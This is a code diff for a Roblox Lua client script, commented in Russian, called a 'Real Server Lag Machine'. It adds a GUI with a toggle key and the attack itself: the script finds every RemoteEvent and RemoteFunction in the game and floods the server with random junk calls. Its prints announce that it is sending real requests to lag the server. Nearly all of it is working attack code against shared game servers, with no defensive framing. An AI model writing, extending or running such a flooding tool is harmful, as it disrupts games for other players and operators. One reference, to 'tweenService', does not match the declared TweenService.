@@ -1,12 +1,14 @@
--- SERVER LAG MACHINE (Working GUI)
+-- REAL SERVER LAG MACHINE
 local player = game:GetService("Players").LocalPlayer
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 local LagEnabled = false
 local requestCount = 0
+local foundRemotes = {}
 
--- GUI как в координатах
+-- GUI
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "ServerLagGUI"
 screenGui.ResetOnSpawn = false
@@ -14,7 +16,7 @@ screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.Parent = player:WaitForChild("PlayerGui")
 
 local mainContainer = Instance.new("Frame")
-mainContainer.Size = UDim2.new(0, 300, 0, 180)
+mainContainer.Size = UDim2.new(0, 320, 0, 200)
 mainContainer.Position = UDim2.new(0, 400, 0, 20)
 mainContainer.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
 mainContainer.BackgroundTransparency = 0.1
@@ -68,7 +70,7 @@ content.BackgroundTransparency = 1
 content.Parent = mainContainer
 
 local lagSection = Instance.new("Frame")
-lagSection.Size = UDim2.new(1, 0, 0, 100)
+lagSection.Size = UDim2.new(1, 0, 0, 120)
 lagSection.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
 lagSection.BorderSizePixel = 0
 lagSection.Parent = content
@@ -89,19 +91,19 @@ lagTitle.TextXAlignment = Enum.TextXAlignment.Left
 lagTitle.Parent = lagSection
 
 local statusLabel = Instance.new("TextLabel")
-statusLabel.Size = UDim2.new(1, -10, 0, 40)
+statusLabel.Size = UDim2.new(1, -10, 0, 60)
 statusLabel.Position = UDim2.new(0, 10, 0, 30)
-statusLabel.Text = "Status: DISABLED"
+statusLabel.Text = "Status: DISABLED\nRemotes: 0\nRequests: 0"
 statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
 statusLabel.BackgroundTransparency = 1
-statusLabel.TextSize = 14
+statusLabel.TextSize = 12
 statusLabel.Font = Enum.Font.GothamBold
 statusLabel.TextWrapped = true
 statusLabel.Parent = lagSection
 
 local actionsFrame = Instance.new("Frame")
 actionsFrame.Size = UDim2.new(1, 0, 0, 40)
-actionsFrame.Position = UDim2.new(0, 0, 0, 110)
+actionsFrame.Position = UDim2.new(0, 0, 0, 130)
 actionsFrame.BackgroundTransparency = 1
 actionsFrame.Parent = content
 
@@ -125,7 +127,7 @@ local function createActionButton(xPosition, text, color)
 end
 
 local toggleBtn = createActionButton(0, "ENABLE LAG", Color3.fromRGB(200, 60, 60))
-local infoBtn = createActionButton(0.52, "INFO", Color3.fromRGB(80, 120, 200))
+local refreshBtn = createActionButton(0.52, "FIND REMOTES", Color3.fromRGB(80, 120, 200))
 
 -- Функции для кнопок
 local function setupButtonHover(button)
@@ -140,7 +142,7 @@ end
 
 setupButtonHover(closeBtn)
 setupButtonHover(toggleBtn)
-setupButtonHover(infoBtn)
+setupButtonHover(refreshBtn)
 
 local scriptRunning = true
 
@@ -179,18 +181,77 @@ UserInputService.InputChanged:Connect(function(input)
     end
 end)
 
+-- НАХОДИМ REAL REMOTE EVENTS И FUNCTIONS
+local function findRemoteObjects()
+    foundRemotes = {}
+    
+    -- Ищем во всех важных местах
+    local searchLocations = {
+        ReplicatedStorage,
+        workspace,
+        game:GetService("Lighting"),
+        game:GetService("StarterPack"),
+        game:GetService("StarterPlayer"),
+        game:GetService("StarterGui")
+    }
+    
+    for _, location in pairs(searchLocations) do
+        for _, obj in pairs(location:GetDescendants()) do
+            if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
+                table.insert(foundRemotes, obj)
+            end
+        end
+    end
+    
+    statusLabel.Text = string.format("Status: DISABLED\nRemotes: %d\nRequests: %d", #foundRemotes, requestCount)
+    print("📡 Found " .. #foundRemotes .. " remote objects")
+end
+
+-- РЕАЛЬНЫЕ ЗАПРОСЫ НА СЕРВЕР
+local function sendRealRequests()
+    if not LagEnabled or #foundRemotes == 0 then return end
+    
+    for i = 1, math.min(5, #foundRemotes) do
+        local remote = foundRemotes[math.random(1, #foundRemotes)]
+        
+        pcall(function()
+            if remote:IsA("RemoteEvent") then
+                -- Отправляем разные типы данных
+                local dataTypes = {
+                    math.random(1, 1000000),
+                    "lag_request_" .. requestCount,
+                    Vector3.new(math.random(-100, 100), math.random(-100, 100), math.random(-100, 100)),
+                    {action = "test", count = requestCount, time = tick()},
+                    true,
+                    false
+                }
+                
+                local data = dataTypes[math.random(1, #dataTypes)]
+                remote:FireServer(data)
+                requestCount = requestCount + 1
+                
+            elseif remote:IsA("RemoteFunction") then
+                remote:InvokeServer("invoke_test_" .. requestCount, math.random())
+                requestCount = requestCount + 1
+            end
+        end)
+        
+        wait(0.01) -- Короткая задержка
+    end
+end
+
 -- Включение/выключение лагов
 toggleBtn.MouseButton1Click:Connect(function()
     LagEnabled = not LagEnabled
     
     if LagEnabled then
-        statusLabel.Text = "Status: ENABLED\nRequests: " .. requestCount
+        statusLabel.Text = string.format("Status: ENABLED\nRemotes: %d\nRequests: %d", #foundRemotes, requestCount)
         statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
         toggleBtn.Text = "DISABLE LAG"
         toggleBtn.BackgroundColor3 = Color3.fromRGB(60, 200, 60)
-        print("🚀 SERVER LAG ACTIVATED!")
+        print("🚀 SERVER LAG ACTIVATED! Using " .. #foundRemotes .. " remotes")
     else
-        statusLabel.Text = "Status: DISABLED"
+        statusLabel.Text = string.format("Status: DISABLED\nRemotes: %d\nRequests: %d", #foundRemotes, requestCount)
         statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
         toggleBtn.Text = "ENABLE LAG"
         toggleBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
@@ -198,11 +259,14 @@ toggleBtn.MouseButton1Click:Connect(function()
     end
 end)
 
-infoBtn.MouseButton1Click:Connect(function()
-    print("📊 Server Lag Machine Info:")
-    print("🎮 Press L to toggle lag")
-    print("📡 Creates server requests")
-    print("💥 May cause server lag")
+refreshBtn.MouseButton1Click:Connect(function()
+    findRemoteObjects()
+    local originalText = refreshBtn.Text
+    refreshBtn.Text = "REFRESHED!"
+    tweenService:Create(refreshBtn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(100, 180, 100)}):Play()
+    wait(1)
+    refreshBtn.Text = originalText
+    tweenService:Create(refreshBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80, 120, 200)}):Play()
 end)
 
 -- Клавиша L для переключения
@@ -213,55 +277,39 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
         LagEnabled = not LagEnabled
         
         if LagEnabled then
-            statusLabel.Text = "Status: ENABLED\nRequests: " .. requestCount
+            statusLabel.Text = string.format("Status: ENABLED\nRemotes: %d\nRequests: %d", #foundRemotes, requestCount)
             statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
             toggleBtn.Text = "DISABLE LAG"
             toggleBtn.BackgroundColor3 = Color3.fromRGB(60, 200, 60)
-            print("🚀 SERVER LAG ACTIVATED! (L Key)")
         else
-            statusLabel.Text = "Status: DISABLED"
+            statusLabel.Text = string.format("Status: DISABLED\nRemotes: %d\nRequests: %d", #foundRemotes, requestCount)
             statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
             toggleBtn.Text = "ENABLE LAG"
             toggleBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
-            print("🛑 Server lag stopped (L Key)")
         end
     end
 end)
 
--- Система создания лагов
+-- Система создания реальных лагов
 spawn(function()
     while scriptRunning do
         if LagEnabled then
-            -- Создаем нагрузку на сервер
-            for i = 1, 5 do
-                -- Имитация сетевых запросов
-                requestCount = requestCount + 1
-                
-                -- Обновляем статус
-                if scriptRunning then
-                    statusLabel.Text = "Status: ENABLED\nRequests: " .. requestCount
-                end
-                
-                -- Создаем вычислительную нагрузку
-                local computations = 0
-                for j = 1, 1000 do
-                    computations = computations + math.sin(j) * math.cos(j)
-                end
-                
-                wait(0.05)
-            end
-            
-            wait(0.1)
+            sendRealRequests()
+            statusLabel.Text = string.format("Status: ENABLED\nRemotes: %d\nRequests: %d", #foundRemotes, requestCount)
+            wait(0.1) -- 10 запросов в секунду
         else
             wait(0.5)
         end
     end
 end)
 
+-- Инициализация
+findRemoteObjects()
 player.CharacterRemoving:Connect(function()
     if scriptRunning then closeGUI() end
 end)
 
-print("🎯 SERVER LAG MACHINE LOADED!")
-print("📍 GUI should appear like Coords Finder")
-print("📝 Click ENABLE LAG or press L to start")
+print("🎯 REAL SERVER LAG MACHINE LOADED!")
+print("📡 Found " .. #foundRemotes .. " remote objects")
+print("🎮 Click ENABLE LAG or press L to start")
+print("💥 Sending real requests to server!")
